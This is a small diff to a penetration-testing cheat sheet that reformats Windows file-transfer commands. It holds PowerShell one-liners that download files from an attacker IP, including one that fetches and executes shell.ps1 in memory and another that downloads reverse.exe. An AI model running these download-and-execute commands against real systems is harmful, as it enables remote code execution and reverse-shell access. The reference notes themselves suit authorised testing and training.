@@ -49,10 +49,10 @@ Windows
 Invoke-WebRequest -uri 10.10.10.10/file.exe -outfile C:\\\\Windows\\temp\\file.exe
 ```
 ```powershell
-powershell iex (New-Object Net.WebClient).DownloadString('<http://10.10.10.10/shell.ps1>');
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1');
 ```
 ```powershell
-powershell -c wget "<http://10.10.10.10/reverse.exe>" -outfile "reverse.exe"
+powershell -c wget "http://10.10.10.10/reverse.exe" -outfile "reverse.exe"
 ```
 ## Using xFreeRDP to access Window Machines
 ```nix
